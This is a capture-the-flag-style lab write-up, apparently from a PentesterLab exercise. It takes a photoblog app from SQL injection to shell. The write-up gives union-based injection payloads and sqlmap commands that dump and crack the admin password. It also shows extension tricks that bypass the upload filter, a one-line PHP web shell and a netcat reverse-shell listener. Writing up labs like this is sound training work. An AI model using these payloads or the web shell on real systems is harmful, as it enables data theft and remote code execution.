## recon
On website.
```
http://ptl-0c865be7-ee5514ce.libcurl.so/cat.php?id=1%27
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1 
 ```
 I got 4 columns `http://ptl-0c865be7-ee5514ce.libcurl.so/cat.php?id=1 order by 4--+-`
 ```
http://ptl-0c865be7-ee5514ce.libcurl.so/cat.php?id=1 union select 1,2,3,4--+-

2
```
Data on columns 2.
```
http://ptl-0c865be7-ee5514ce.libcurl.so/cat.php?id=1 union select 1,user(),3,4--+-
ptl@172.30.0.15
```
Now to be fast i will use sqlmap
```
└─# /home/bloman/tools/Web/sqlmap/sqlmap.py -u "http://ptl-0c865be7-ee5514ce.libcurl.so/cat.php?id=1" -p id --dbs
available databases [2]:
[*] information_schema
[*] photoblog

└─# /home/bloman/tools/Web/sqlmap/sqlmap.py -u "http://ptl-0c865be7-ee5514ce.libcurl.so/cat.php?id=1" -p id -D photoblog -T users -C login,password --dump
[16:18:16] [INFO] cracked password 'P4ssw0rd' for user 'admin'                                                                      
Database: photoblog                                                                                                                 
Table: users
[1 entry]
+-------+---------------------------------------------+
| login | password                                    |
+-------+---------------------------------------------+
| admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |
+-------+---------------------------------------------+

```
Now logged in on admin.
Now i will add my shell using admin and manage picture.
But when i add php. it's saying NO PHP!!
Time to bypass that shit.
```
└─# mv phpbash.php phpbash.pHP            
```
It's work but my shell not showing.
The things i will do now is to bruteforce this url:
`http://ptl-be4f25ce-815d3922.libcurl.so/admin/`
```
└─# ffuf -u "http://ptl-be4f25ce-815d3922.libcurl.so/admin/FUZZ" -w /usr/share/wordlists/dirb/common.txt
________________________________________________

 :: Method           : GET
 :: URL              : http://ptl-be4f25ce-815d3922.libcurl.so/admin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 322, Words: 22, Lines: 12, Duration: 801ms]
.htpasswd               [Status: 403, Size: 322, Words: 22, Lines: 12, Duration: 801ms]
.hta                    [Status: 403, Size: 317, Words: 22, Lines: 12, Duration: 830ms]
                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1547ms]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 441ms]
uploads                 [Status: 301, Size: 360, Words: 20, Lines: 10, Duration: 512ms]

```
I will check uploads.
http://ptl-be4f25ce-815d3922.libcurl.so/admin/uploads/
Yeah i found my shell. But the extension is not working. so i bruteforced using burp and now i will use `.php3`
```
└─# cat ivan.php3 
<?php
	  system($_GET['cmd']);
?>

```
When i upload it and execute it i got 
```
Notice: Undefined index: cmd in /var/www/admin/uploads/ivan.php3 on line 2

Warning: system(): Cannot execute a blank command in /var/www/admin/uploads/ivan.php3 on line 2
```
so now i added `http://ptl-be4f25ce-815d3922.libcurl.so/admin/uploads/ivan.php3?cmd=whoami` and i got `www-data `
exercise completed. 
`http://ptl-be4f25ce-815d3922.libcurl.so/admin/uploads/ivan.php3?cmd=/usr/local/bin/score%20e08a92d8-b33f-4fd1-afe0-18fd15e61d35`
I used ngrok to get a shell
```
└─$ sudo rlwrap nc -lvnp 1337
[sudo] password for bloman: 
listening on [any] 1337 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 52742
Linux a42a2c48446c 5.10.0-10-amd64 #1 SMP Debian 5.10.84-1 (2021-12-08) x86_64 GNU/Linux
 12:20:22 up 675 days,  7:44,  0 users,  load average: 0.02, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@a42a2c48446c:/$ whoami
whoami
www-data
www-data@a42a2c48446c:/$ 

```